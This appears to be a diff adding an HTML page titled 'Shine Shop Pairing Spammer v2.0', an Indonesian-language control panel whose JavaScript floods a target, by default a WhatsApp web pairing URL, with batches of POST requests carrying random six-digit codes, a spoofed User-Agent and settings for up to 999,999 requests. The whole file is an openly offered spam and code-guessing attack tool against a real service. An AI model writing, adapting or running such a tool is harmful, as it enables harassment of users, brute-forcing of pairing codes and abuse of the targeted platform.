@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>🐉 DRAGON PAIRING SPAMMER - CONTROL PANEL</title>
+<style>
+body{background:#0a0a0a;color:#00ff41;font-family:'Courier New',monospace;padding:20px}
+.container{max-width:800px;margin:auto;border:2px solid #00ff41;padding:30px;border-radius:10px}
+.input-group{margin:15px 0;display:flex;gap:10px;align-items:center}
+label{width:180px;color:#ff00ff}
+input[type="number"],input[type="text"]{background:#111;border:1px solid #00ff41;color:#00ff41;padding:10px;width:200px;border-radius:5px}
+button{background:#00ff41;color:#000;border:none;padding:12px 30px;font-weight:bold;cursor:pointer;border-radius:5px;font-family:monospace}
+button:hover{background:#ff00ff;color:#fff}
+button.danger{background:#ff0044;color:#fff}
+.status{background:#111;padding:10px;margin:10px 0;border-left:3px solid #ff00ff}
+#log{height:300px;overflow-y:scroll;background:#000;padding:10px;border:1px solid #333;font-size:12px}
+</style>
+</head>
+<body>
+<div class="container">
+<h1>🐉 SHINE SHOP PAIRING SPAMMER v2.0</h1>
+<div class="status">⚡ STATUS: <span id="statusText" style="color:#0f0">IDLE</span></div>
+
+<div class="input-group">
+    <label>🔢 JUMLAH PER BATCH:</label>
+    <input type="number" id="batchSize" value="50" min="1" max="9999">
+</div>
+
+<div class="input-group">
+    <label>⏱️ INTERVAL (ms):</label>
+    <input type="number" id="interval" value="100" min="10" max="10000">
+</div>
+
+<div class="input-group">
+    <label>🔄 TOTAL REQUEST:</label>
+    <input type="number" id="totalRequests" value="1000" min="1" max="999999">
+</div>
+
+<div class="input-group">
+    <label>🎯 TARGET ENDPOINT:</label>
+    <input type="text" id="targetUrl" value="https://web.whatsapp.com/pairing" style="width:400px">
+</div>
+
+<div style="display:flex;gap:10px;margin:20px 0">
+    <button onclick="startSpam()">🔥 MULAI SPAM</button>
+    <button class="danger" onclick="stopSpam()">⛔ STOP</button>
+    <button onclick="clearLog()">🗑️ CLEAR LOG</button>
+</div>
+
+<div id="log">[SHINE SHOP] Siap menjalankan perintah Bos...\n</div>
+</div>
+
+<script>
+let running = false;
+let logCount = 0;
+
+function updateLog(msg) {
+    const log = document.getElementById('log');
+    log.innerHTML += `[${new Date().toTimeString().slice(0,8)}] ${msg}\n`;
+    log.scrollTop = log.scrollHeight;
+}
+
+function clearLog() {
+    document.getElementById('log').innerHTML = '[DRAGON] Log dibersihkan...\n';
+}
+
+async function startSpam() {
+    if(running) {
+        updateLog('⚠️ Spam masih berjalan Bos! Stop dulu kalo mau ganti setting.');
+        return;
+    }
+    
+    running = true;
+    document.getElementById('statusText').style.color = '#ff00ff';
+    document.getElementById('statusText').textContent = 'SPAMMING 🔥';
+    
+    const batch = parseInt(document.getElementById('batchSize').value) || 50;
+    const interval = parseInt(document.getElementById('interval').value) || 100;
+    const total = parseInt(document.getElementById('totalRequests').value) || 1000;
+    const target = document.getElementById('targetUrl').value || 'https://web.whatsapp.com/pairing';
+    
+    updateLog(`🚀 Memulai spam ke ${target}`);
+    updateLog(`📊 Batch: ${batch} | Interval: ${interval}ms | Total: ${total}`);
+    
+    let sent = 0;
+    let success = 0;
+    let failed = 0;
+    
+    while(sent < total && running) {
+        const promises = [];
+        const currentBatch = Math.min(batch, total - sent);
+        
+        for(let i = 0; i < currentBatch; i++) {
+            const code = Math.floor(100000 + Math.random() * 900000).toString();
+            promises.push(
+                fetch(target, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                    },
+                    body: `code=${code}`,
+                    mode: 'no-cors'
+                })
+                .then(res => {
+                    success++;
+                    updateLog(`✅ Code ${code} - Status: ${res.status || 'OK'}`);
+                })
+                .catch(err => {
+                    failed++;
+                    updateLog(`❌ Code ${code} - Failed: ${err.message}`);
+                })
+            );
+        }
+        
+        await Promise.allSettled(promises);
+        sent += currentBatch;
+        updateLog(`📦 Batch selesai | Total: ${sent}/${total} | Sukses: ${success} | Gagal: ${failed}`);
+        
+        if(sent < total && running) {
+            await new Promise(resolve => setTimeout(resolve, interval));
+        }
+    }
+    
+    running = false;
+    document.getElementById('statusText').style.color = '#0f0';
+    document.getElementById('statusText').textContent = 'SELESAI ✅';
+    updateLog(`🏁 Spam selesai! Total terkirim: ${sent} | Sukses: ${success} | Gagal: ${failed}`);
+}
+
+function stopSpam() {
+    running = false;
+    document.getElementById('statusText').style.color = '#ff0044';
+    document.getElementById('statusText').textContent = 'STOPPED ⛔';
+    updateLog('🛑 Spam dihentikan oleh user!');
+}
+</script>
+</body>
+</html>
